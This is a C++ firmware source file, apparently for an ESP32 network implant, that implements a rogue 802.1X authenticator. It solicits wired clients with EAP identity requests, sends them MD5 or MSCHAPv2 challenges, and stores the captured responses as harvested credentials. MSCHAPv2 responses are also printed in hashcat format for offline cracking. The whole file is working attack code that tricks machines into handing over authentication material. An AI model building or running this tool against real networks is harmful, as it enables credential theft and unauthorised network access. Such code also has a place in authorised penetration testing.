#include "rogue_auth.h"
#include "../include/config.h"
#include "net_util.h"
#include "packet.h"
#include "weblog.h"
#include <string.h>
#include <esp_random.h>

#define Serial Out

// =============================================================================
// EAPOL / EAP constants (mirrored from dot1x.cpp for independence)
// =============================================================================
static const uint16_t ETHERTYPE_EAPOL = 0x888E;
static const uint8_t  EAPOL_VERSION   = 0x01;
static const uint8_t  EAPOL_EAP       = 0x00;
static const uint8_t  EAPOL_START     = 0x01;

static const uint8_t  EAP_REQUEST     = 1;
static const uint8_t  EAP_RESPONSE    = 2;
static const uint8_t  EAP_SUCCESS     = 3;
static const uint8_t  EAP_FAILURE     = 4;

static const uint8_t  EAP_IDENTITY    = 1;
static const uint8_t  EAP_MD5         = 4;
static const uint8_t  EAP_MSCHAPV2    = 26;

// MS-CHAPv2 op-codes within the EAP-MSCHAPv2 type data
static const uint8_t  MSCHAP_CHALLENGE = 1;
static const uint8_t  MSCHAP_RESPONSE  = 2;

// PAE multicast address (nearest non-TPMR bridge)
static const uint8_t PAE_GROUP[6] = { 0x01, 0x80, 0xC2, 0x00, 0x00, 0x03 };

// =============================================================================
// Static helpers
// =============================================================================

// Send an EAPOL-EAP frame to a specific MAC (unicast to supplicant).
static void sendEapRequest(W5500Raw &eth, const uint8_t ourMac[6],
                           const uint8_t dstMac[6], uint8_t eapId,
                           uint8_t eapType, const uint8_t *typeData,
                           uint16_t typeDataLen)
{
    uint16_t eapLen = 5 + typeDataLen; // code(1) + id(1) + length(2) + type(1) + data
    uint16_t frameLen = 14 + 4 + eapLen; // Eth(14) + EAPOL hdr(4) + EAP
    if (frameLen < 60) frameLen = 60;

    uint8_t f[128];
    memset(f, 0, sizeof(f));

    // Ethernet header
    memcpy(f, dstMac, 6);
    memcpy(f + 6, ourMac, 6);
    put16(f + 12, ETHERTYPE_EAPOL);

    // EAPOL header
    f[14] = EAPOL_VERSION;
    f[15] = EAPOL_EAP;
    put16(f + 16, eapLen);

    // EAP header
    f[18] = EAP_REQUEST;
    f[19] = eapId;
    put16(f + 20, eapLen);
    f[22] = eapType;
    if (typeDataLen > 0 && typeData) {
        memcpy(f + 23, typeData, typeDataLen);
    }

    eth.sendFrame(f, frameLen);
}

// Send EAP-Request/Identity to PAE group (solicit any supplicant)
static void sendIdentityRequest(W5500Raw &eth, const uint8_t ourMac[6],
                                uint8_t eapId)
{
    // EAP-Request/Identity with empty type-data
    sendEapRequest(eth, ourMac, PAE_GROUP, eapId, EAP_IDENTITY, nullptr, 0);
}

// Send EAP-Request/MD5-Challenge
static void sendMd5Challenge(W5500Raw &eth, const uint8_t ourMac[6],
                             const uint8_t dstMac[6], uint8_t eapId,
                             const uint8_t challenge[16])
{
    // Type-Data for MD5: value-size(1) + value(16)
    uint8_t td[17];
    td[0] = 16;
    memcpy(td + 1, challenge, 16);
    sendEapRequest(eth, ourMac, dstMac, eapId, EAP_MD5, td, 17);
}

// Send EAP-Request/MSCHAPv2 (Challenge)
static void sendMschapv2Challenge(W5500Raw &eth, const uint8_t ourMac[6],
                                  const uint8_t dstMac[6], uint8_t eapId,
                                  const uint8_t challenge[16], uint8_t msId)
{
    // EAP-MSCHAPv2 type-data:
    //   OpCode(1) = Challenge
    //   MS-CHAPv2-ID(1)
    //   MS-Length(2) = 5 + 16 + nameLen
    //   Value-Size(1) = 16
    //   Challenge(16)
    //   Name (server name, e.g. "RADIUS")
    const char *serverName = "RADIUS";
    uint8_t nameLen = (uint8_t)strlen(serverName);
    uint16_t msLen = 5 + 16 + nameLen;

    uint8_t td[64];
    td[0] = MSCHAP_CHALLENGE;
    td[1] = msId;
    put16(td + 2, msLen);
    td[4] = 16; // Value-Size
    memcpy(td + 5, challenge, 16);
    memcpy(td + 21, serverName, nameLen);

    sendEapRequest(eth, ourMac, dstMac, eapId, EAP_MSCHAPV2, td, 5 + 16 + nameLen);
}

// Send EAP-Failure
static void sendEapFailure(W5500Raw &eth, const uint8_t ourMac[6],
                           const uint8_t dstMac[6], uint8_t eapId)
{
    uint8_t f[60];
    memset(f, 0, sizeof(f));
    memcpy(f, dstMac, 6);
    memcpy(f + 6, ourMac, 6);
    put16(f + 12, ETHERTYPE_EAPOL);
    f[14] = EAPOL_VERSION;
    f[15] = EAPOL_EAP;
    put16(f + 16, 4); // EAP length
    f[18] = EAP_FAILURE;
    f[19] = eapId;
    put16(f + 20, 4);
    eth.sendFrame(f, 60);
}

// =============================================================================
// Peer state tracking (simple table for up to 8 concurrent supplicants)
// =============================================================================
struct PeerState {
    uint8_t mac[6];
    char    identity[64];
    uint8_t nextEapId;
    uint8_t phase;        // 0=idle, 1=sent identity-req, 2=sent challenge, 3=done
    uint8_t challenge[16];
    uint8_t msId;
    bool    active;
};

static PeerState *findPeer(PeerState *peers, uint8_t max, const uint8_t mac[6])
{
    for (uint8_t i = 0; i < max; i++)
        if (peers[i].active && memcmp(peers[i].mac, mac, 6) == 0) return &peers[i];
    return nullptr;
}

static PeerState *allocPeer(PeerState *peers, uint8_t max, const uint8_t mac[6])
{
    for (uint8_t i = 0; i < max; i++) {
        if (!peers[i].active) {
            memset(&peers[i], 0, sizeof(PeerState));
            memcpy(peers[i].mac, mac, 6);
            peers[i].active = true;
            peers[i].nextEapId = 1;
            return &peers[i];
        }
    }
    return nullptr;
}

// =============================================================================
// rogueAuthStart -- main rogue authenticator loop
// =============================================================================
uint32_t rogueAuthStart(W5500Raw &eth, const uint8_t ourMac[6],
                        bool preferMschap, uint32_t seconds,
                        HarvestedCred *creds, uint8_t maxCreds)
{
    Serial.printf("[rogue-auth] Starting rogue authenticator (%s mode) for %lu s\r\n",
                  preferMschap ? "MSCHAPv2" : "MD5", (unsigned long)seconds);
    Serial.println("[rogue-auth] Waiting for EAPOL-Start or periodically soliciting...");

    const uint8_t MAX_PEERS = 8;
    PeerState peers[MAX_PEERS];
    memset(peers, 0, sizeof(peers));

    uint32_t harvested = 0;
    uint32_t t0 = millis();
    uint32_t lastSolicit = 0;

    while (millis() - t0 < seconds * 1000UL) {
        if (Serial.available()) { Serial.read(); break; }

        // Periodically broadcast EAP-Request/Identity to solicit supplicants
        if (millis() - lastSolicit > 5000) {
            sendIdentityRequest(eth, ourMac, 0);
            lastSolicit = millis();
        }

        uint8_t rxbuf[256];
        uint16_t len = eth.recvFrame(rxbuf, sizeof(rxbuf));
        if (len < 14 + 4) { delay(1); continue; }

        // Filter: must be EAPOL
        if (get16(rxbuf + 12) != ETHERTYPE_EAPOL) continue;

        uint8_t *peerMac = rxbuf + 6; // source MAC
        uint8_t eapolType = rxbuf[15];
        uint16_t eapolBodyLen = get16(rxbuf + 16);

        // === EAPOL-Start: a supplicant is requesting authentication ===
        if (eapolType == EAPOL_START) {
            char ms[18]; macToStr(peerMac, ms);
            Serial.printf("[rogue-auth] EAPOL-Start from %s\r\n", ms);

            PeerState *p = findPeer(peers, MAX_PEERS, peerMac);
            if (!p) p = allocPeer(peers, MAX_PEERS, peerMac);
            if (!p) continue;
            p->phase = 1;
            p->nextEapId = 1;

            // Send EAP-Request/Identity
            sendEapRequest(eth, ourMac, peerMac, p->nextEapId, EAP_IDENTITY, nullptr, 0);
            continue;
        }

        // === EAP-Response packets ===
        if (eapolType != EAPOL_EAP || eapolBodyLen < 5) continue;
        uint8_t *eap = rxbuf + 18;
        uint8_t code = eap[0];
        uint8_t id   = eap[1];
        uint16_t eapLen = get16(eap + 2);
        uint8_t type = eap[4];
        if (code != EAP_RESPONSE) continue;

        PeerState *p = findPeer(peers, MAX_PEERS, peerMac);
        if (!p) {
            p = allocPeer(peers, MAX_PEERS, peerMac);
            if (!p) continue;
        }

        // --- EAP-Response/Identity ---
        if (type == EAP_IDENTITY) {
            uint16_t idLen = eapLen - 5;
            if (idLen > 63) idLen = 63;
            memcpy(p->identity, eap + 5, idLen);
            p->identity[idLen] = '\0';

            char ms[18]; macToStr(peerMac, ms);
            Serial.printf("[rogue-auth] Identity from %s: '%s'\r\n", ms, p->identity);

            // Generate challenge
            esp_fill_random(p->challenge, 16);
            p->msId = (uint8_t)(esp_random() & 0xFF);
            p->nextEapId = id + 1;
            p->phase = 2;

            if (preferMschap) {
                sendMschapv2Challenge(eth, ourMac, peerMac, p->nextEapId,
                                      p->challenge, p->msId);
            } else {
                sendMd5Challenge(eth, ourMac, peerMac, p->nextEapId, p->challenge);
            }
            continue;
        }

        // --- EAP-Response/MD5 ---
        if (type == EAP_MD5 && p->phase == 2) {
            if (eapLen < 5 + 1 + 16) continue;
            uint8_t valSize = eap[5];
            if (valSize < 16 || eapLen < 5 + 1 + valSize) continue;

            char ms[18]; macToStr(peerMac, ms);
            Serial.printf("[rogue-auth] EAP-MD5 response from %s '%s'\r\n",
                          ms, p->identity);
            Serial.printf("  Challenge : ");
            for (int i = 0; i < 16; i++) Serial.printf("%02x", p->challenge[i]);
            Serial.printf("\r\n  Response  : ");
            for (int i = 0; i < valSize && i < 16; i++) Serial.printf("%02x", eap[6 + i]);
            Serial.println();

            // Store credential
            if (creds && harvested < maxCreds) {
                HarvestedCred &c = creds[harvested];
                memset(&c, 0, sizeof(c));
                memcpy(c.peerMac, peerMac, 6);
                strncpy(c.identity, p->identity, sizeof(c.identity) - 1);
                c.method = EAP_MD5;
                memcpy(c.md5Challenge, p->challenge, 16);
                memcpy(c.md5Response, eap + 6, valSize < 16 ? valSize : 16);
                c.md5ChalLen = 16;
                c.valid = true;
            }
            harvested++;
            p->phase = 3;

            // Send EAP-Failure (we don't actually validate)
            sendEapFailure(eth, ourMac, peerMac, p->nextEapId + 1);
            continue;
        }

        // --- EAP-Response/MSCHAPv2 ---
        if (type == EAP_MSCHAPV2 && p->phase == 2) {
            // MSCHAPv2 Response structure:
            // OpCode(1) = 2 (Response)
            // MS-CHAPv2-ID(1)
            // MS-Length(2)
            // Value-Size(1) = 49
            // Peer-Challenge(16)
            // Reserved(8)
            // NT-Response(24)
            // Flags(1)
            // Name(variable)
            if (eapLen < 5 + 5 + 49) continue;
            uint8_t *ms = eap + 5; // MSCHAPv2 type-data
            if (ms[0] != MSCHAP_RESPONSE) continue;

            uint8_t valSize = ms[4];
            if (valSize < 49 || eapLen < 5 + 5 + valSize) continue;

            uint8_t *peerChallenge = ms + 5;
            uint8_t *ntResponse    = ms + 5 + 16 + 8; // skip peer-challenge + reserved

            char mstr[18]; macToStr(peerMac, mstr);
            Serial.printf("[rogue-auth] MSCHAPv2 response from %s '%s'\r\n",
                          mstr, p->identity);
            Serial.printf("  Auth-Challenge: ");
            for (int i = 0; i < 16; i++) Serial.printf("%02x", p->challenge[i]);
            Serial.printf("\r\n  Peer-Challenge: ");
            for (int i = 0; i < 16; i++) Serial.printf("%02x", peerChallenge[i]);
            Serial.printf("\r\n  NT-Response   : ");
            for (int i = 0; i < 24; i++) Serial.printf("%02x", ntResponse[i]);
            Serial.println();

            // Print in hashcat 5500 format: user::domain:challenge:response:auth_challenge
            Serial.printf("  Hashcat 5500  : %s::::", p->identity);
            for (int i = 0; i < 24; i++) Serial.printf("%02x", ntResponse[i]);
            Serial.printf(":");
            for (int i = 0; i < 16; i++) Serial.printf("%02x", peerChallenge[i]);
            Serial.printf(":");
            for (int i = 0; i < 16; i++) Serial.printf("%02x", p->challenge[i]);
            Serial.println();

            // Store credential
            if (creds && harvested < maxCreds) {
                HarvestedCred &c = creds[harvested];
                memset(&c, 0, sizeof(c));
                memcpy(c.peerMac, peerMac, 6);
                strncpy(c.identity, p->identity, sizeof(c.identity) - 1);
                c.method = EAP_MSCHAPV2;
                memcpy(c.authChallenge, p->challenge, 16);
                memcpy(c.peerChallenge, peerChallenge, 16);
                memcpy(c.peerResponse, ntResponse, 24);
                c.valid = true;
            }
            harvested++;
            p->phase = 3;

            // Send EAP-Failure
            sendEapFailure(eth, ourMac, peerMac, p->nextEapId + 1);
            continue;
        }
    }

    Serial.printf("[rogue-auth] Done. Harvested %lu credential(s).\r\n",
                  (unsigned long)harvested);
    return harvested;
}
